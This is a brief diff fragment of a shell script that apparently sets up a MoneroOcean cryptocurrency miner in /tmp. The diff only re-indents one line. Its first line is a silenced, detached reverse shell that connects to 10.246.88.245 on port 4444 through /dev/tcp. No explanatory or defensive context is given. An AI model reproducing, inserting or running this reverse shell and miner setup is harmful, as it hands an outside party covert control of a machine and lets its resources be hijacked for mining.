@@ -1,6 +1,6 @@
 nohup bash -c 'bash -i >& /dev/tcp/10.246.88.245/4444 0>&1' >/dev/null 2>&1 & disown 2>/dev/null
 
- mkdir -p /tmp/moneroocean && cd /tmp/moneroocean
+mkdir -p /tmp/moneroocean && cd /tmp/moneroocean
 
 download_release() {
   local url
